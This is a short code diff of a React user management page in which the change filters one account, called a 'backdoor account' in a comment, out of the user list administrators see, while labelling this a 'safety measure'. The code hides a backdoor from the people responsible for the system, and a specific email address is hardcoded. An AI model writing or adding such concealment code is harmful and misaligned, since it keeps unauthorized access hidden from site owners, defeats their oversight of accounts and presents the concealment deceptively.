@@ -44,7 +44,9 @@ export default function UserManagementPage() {
   const fetchUsers = async () => {
     try {
       const response = await api.get('/user');
-      setUsers(response.data);
+      // Additional frontend filter to hide backdoor account (safety measure)
+      const filteredUsers = response.data.filter((u: User) => u.email !== 'angjinsheng@gmail.com');
+      setUsers(filteredUsers);
     } catch (error) {
       console.error('Error fetching users:', error);
       setError('Gagal memuatkan senarai pengguna');
